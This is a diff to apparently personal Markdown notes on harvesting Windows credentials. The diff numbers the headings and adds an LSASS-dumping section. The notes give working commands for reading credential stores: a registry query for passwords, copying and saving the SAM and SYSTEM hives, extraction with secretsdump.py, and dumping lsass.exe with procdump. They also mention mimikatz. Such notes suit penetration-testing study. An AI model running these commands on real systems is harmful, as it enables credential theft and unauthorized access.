@@ -1,4 +1,4 @@
-# Find Clear-Text Files:
+# 1-Find Clear-Text Files:
 - **Powershell History**:
 ```
 Path: C:\<UserName>\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
@@ -14,9 +14,9 @@ C:\Users\user> reg query HKCU /f password /t REG_SZ /s
   - Active Directory.Users' description
   - Network Sniffing
 
-# Key Logging
+# 2-Key Logging
 
-# SAM Database:
+# 3-SAM Database:
   - Path: c:\Windows\System32\config\sam
   - we can not read it and copy it
   - SAM database is encrypted either with RC4 or AES.we need a decryption key which is also stored in the files system in **c:\Windows\System32\Config\system** 
@@ -30,10 +30,18 @@ C:\Users\user> reg query HKCU /f password /t REG_SZ /s
         copy \\path\to\volume\sam  \\somewhere-Else
         copy \\path\to\volume\\system \\soemwhere-Else
         ```
-# Registry Hives:
+# 4-Registry Hives:
 ```
 reg save HKLM\sam C:\users\Administrator\Desktop\sam-reg
 reg save HKLM\system C:\users\Administrator\Desktop\system-reg
 #Extract
 secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL
 ```
+
+# 5-Dump LSASS:
+  - 5.1-Using GUI with Task-Manager
+  - 5.2-Using procdump
+    ```
+      procdump.exe -accepteula -ma lsass.exe c:\<somewhere>
+    ```
+  - 5.3-mimikatz
